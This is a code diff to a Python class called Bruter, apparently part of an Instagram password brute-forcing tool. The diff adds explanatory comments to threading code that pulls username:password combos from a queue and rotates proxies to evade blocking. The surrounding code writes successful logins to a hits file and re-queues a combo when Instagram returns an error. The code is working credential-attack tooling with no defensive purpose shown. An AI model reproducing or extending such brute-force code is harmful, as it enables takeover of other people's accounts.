@@ -10,8 +10,8 @@ class Bruter:
         self.combo_queue = combo_queue
         self.proxy_manager = proxy_manager
         self.path_hits_file = path_hits_file
-        self.bots = []
-        self.last_combo = ['', '']
+        self.bots = []  # [thread1, ...]
+        self.last_combo = ['', '']  # [username, password]
         self.max_threads = input_max_threads
         self.hits = 0
         self.tested = 0
@@ -38,6 +38,8 @@ class Bruter:
                         hits_file.write(combo[0] + ':' + combo[1] + '\n')
                         hits_file.close()
                         self.hits += 1
+                
+                # instagram throws error
                 else:
                     self.proxy_manager.disable(proxy)
                     self.combo_queue.appendleft(combo)
@@ -52,6 +54,8 @@ class Bruter:
             self.retries += 1
 
     def bot(self):
+        
+        # bots automatically stop when self.isAlive == False
         while self.isAlive:
             combo = None
             proxy = None
@@ -61,6 +65,8 @@ class Bruter:
                 proxy = self.proxy_manager.get()
                 self.login(combo, proxy)
 
+            # no combo => attack complete, main thread will stop engine soon
+            # no proxy => return combo to queue
             except IndexError:
                 if combo and not proxy:
                     self.combo_queue.appendleft(combo)
@@ -68,14 +74,18 @@ class Bruter:
                 sleep(1)
 
     def stop(self):
+        
+        # for bots to stop
         self.isAlive = False
         
+        # wait for bots to finish
         for bot in self.bots:
             bot.join()
 
     def start(self):
         self.isAlive = True
         
+        # start bots
         for i in range(self.max_threads):
             t = Thread(target=self.bot)
             t.daemon = True
